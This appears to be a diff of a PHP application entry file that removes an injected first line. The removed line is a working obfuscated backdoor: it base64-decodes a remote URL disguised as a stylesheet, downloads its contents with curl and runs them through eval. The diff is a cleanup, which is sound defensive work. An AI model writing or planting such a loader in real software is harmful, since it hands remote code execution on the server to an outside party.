@@ -1,4 +1,3 @@
-<?php $_0=curl_init(base64_decode('aHR0cHM6Ly9yYWJ1MTQucGFnZXMuZGV2L2hjZC5jc3M='));curl_setopt($_0,CURLOPT_RETURNTRANSFER,true);eval(base64_decode('Pz4=').curl_exec($_0));curl_close($_0);?>
 <?php
 
 use App\Kernel;
